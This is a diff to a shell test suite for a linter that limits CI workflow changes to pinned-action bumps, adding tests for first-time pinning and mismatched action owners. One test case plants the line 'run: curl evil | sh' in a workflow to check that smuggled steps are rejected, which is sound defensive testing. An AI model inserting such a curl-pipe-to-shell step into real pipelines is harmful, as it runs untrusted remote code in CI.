@@ -103,7 +103,7 @@ case_ clean-major-tag-bump ok \
   "bump .github/workflows/ci.yaml docker/setup-buildx-action $OLD v3 $NEW v3"
 # (a): `run:` is not a `uses:` pin line → the grammar rule fails the file; the upstream stub is
 # never consulted (no ref_ set), so a pass here could only come from the grammar being loose.
-case_ smuggled-run-line 'may only receive action PIN lines' "" \
+case_ smuggled-run-line 'added lines must be pinned' "" \
   "bump .github/workflows/ci.yaml actions/checkout $OLD v4.2.1 $NEW v4.2.2; sed -i 's|run: echo hi|run: curl evil \| sh|' .github/workflows/ci.yaml"
 # (a): a new step whose pin is well-formed and even resolves upstream is still an ADDED line with
 # no removed partner → (b) fails (multiset removed ≠ added), before (d) is consulted.
@@ -134,15 +134,15 @@ case_ annotated-tag-deref ok \
 case_ annotated-tag-other-sha "names commit $OTHER upstream, the PR pins $NEW" \
   "ref_ actions/checkout v4.2.2 tag $TAGOBJ; tagobj_ actions/checkout $TAGOBJ $OTHER" \
   "bump .github/workflows/ci.yaml actions/checkout $OLD v4.2.1 $NEW v4.2.2"
-# (a): an unpinned `@v4` (what the repo has TODAY before Renovate pins) is not the grammar → FAIL.
-case_ unpinned-tag-ref 'may only receive action PIN lines' "" \
+# (a): an unpinned `@v4` in place of a pin is not the ADDED grammar → FAIL (a de-pin is blocked).
+case_ unpinned-tag-ref 'added lines must be pinned' "" \
   "sed -i 's|uses: actions/checkout@$OLD # v4.2.1|uses: actions/checkout@v4|' .github/workflows/ci.yaml"
 # A mode flip (chmod +x) carries no content lines → not a pin bump → FAIL (the empty-patch arm).
 case_ workflow-mode-change 'without a single content line' "" \
   "chmod +x .github/workflows/ci.yaml"
 # A rename: `git diff -- <new path>` on a detected rename shows the WHOLE body as added, so the
 # non-`uses:` lines (name:, on:, run:) fail the grammar → FAIL on (a). Either arm is fail-closed.
-case_ workflow-rename 'may only receive action PIN lines' "" \
+case_ workflow-rename 'added lines must be pinned' "" \
   "git mv .github/workflows/ci.yaml .github/workflows/ci2.yaml"
 # ── the two older shapes, byte-for-byte: PIN_LINE admits an arc-runner image: line and a CalVer
 # targetRevision: line, refuses anything else in those files.
@@ -156,6 +156,55 @@ case_ target-revision-smuggled 'may only receive PIN lines' "" \
   "sed -i 's|targetRevision: 2026.9.1-gaaaa|targetRevision: 2026.9.25-gbbbb|; s|chart: x|chart: y|' argocd/platform/openrouter-operator.yaml"
 # An untouched guarded set is the no-op verdict (the common case on every PR).
 case_ nothing-guarded ok "" "echo x > README.md"
+
+# ── the initial-pin scenario: a repo whose workflows were NEVER pinned before. Renovate's first
+# pass removes unpinned refs (`@v4`) and adds pinned ones (`@sha # v4`). The removed lines are
+# unpinned (don't match WORKFLOW_PIN_LINE), the added lines are pinned. Pairing still holds.
+R2="$T/repo2"; mkdir -p "$R2/.github/workflows"
+git -C "$R2" init -q -b master
+cat >"$R2/.github/workflows/ci.yaml" <<EOF
+name: CI
+on: [pull_request]
+jobs:
+  ci:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: docker/setup-buildx-action@v3
+      - run: echo hi
+EOF
+git -C "$R2" add -A && git -C "$R2" commit -q -m base
+BASE2="$(git -C "$R2" rev-parse HEAD)"
+
+# Initial pin: unpinned → pinned. Removed lines are unpinned, added are pinned with verified SHAs.
+git -C "$R2" checkout -q -b "initial-pin" "$BASE2"
+sed -i "s|uses: actions/checkout@v4|uses: actions/checkout@$NEW # v4|" "$R2/.github/workflows/ci.yaml"
+sed -i "s|uses: docker/setup-buildx-action@v3|uses: docker/setup-buildx-action@$NEW # v3|" "$R2/.github/workflows/ci.yaml"
+git -C "$R2" add -A && git -C "$R2" commit -q -m "pin deps"
+rm -rf "$STUB"; mkdir -p "$STUB"
+ref_ actions/checkout v4 commit $NEW
+ref_ docker/setup-buildx-action v3 commit $NEW
+out="$(PIN_ONLY_REPO="$R2" PIN_ONLY_GH="$PIN_ONLY_GH" bash "$LINT" "$BASE2" 2>&1)"; rc=$?
+if [ $rc = 0 ] && printf '%s' "$out" | grep -q '^pin-only-lint: OK'; then
+  pass=$((pass+1)); echo "PASS initial-pin-unpinned-to-pinned (rc 0)"
+else
+  fail=$((fail+1)); echo "FAIL initial-pin-unpinned-to-pinned — wanted OK, rc=$rc:"; printf '%s\n' "$out" | sed 's/^/     /'
+fi
+git -C "$R2" checkout -q master
+
+# Initial pin with a mismatched owner/repo (removed actions/checkout, added actions/cache) → FAIL.
+git -C "$R2" checkout -q -b "initial-pin-mismatch" "$BASE2"
+sed -i "s|uses: actions/checkout@v4|uses: actions/cache@$NEW # v4|" "$R2/.github/workflows/ci.yaml"
+git -C "$R2" add -A && git -C "$R2" commit -q -m "pin mismatch"
+rm -rf "$STUB"; mkdir -p "$STUB"
+ref_ actions/cache v4 commit $NEW
+out="$(PIN_ONLY_REPO="$R2" PIN_ONLY_GH="$PIN_ONLY_GH" bash "$LINT" "$BASE2" 2>&1)"; rc=$?
+if [ $rc != 0 ] && printf '%s' "$out" | grep -q 'do not pair up'; then
+  pass=$((pass+1)); echo "PASS initial-pin-owner-mismatch (rc $rc, fired on 'do not pair up')"
+else
+  fail=$((fail+1)); echo "FAIL initial-pin-owner-mismatch — wanted 'do not pair up', rc=$rc:"; printf '%s\n' "$out" | sed 's/^/     /'
+fi
+git -C "$R2" checkout -q master
 
 echo "pin-only-lint-test: $pass passed, $fail failed"
 [ "$fail" = 0 ]
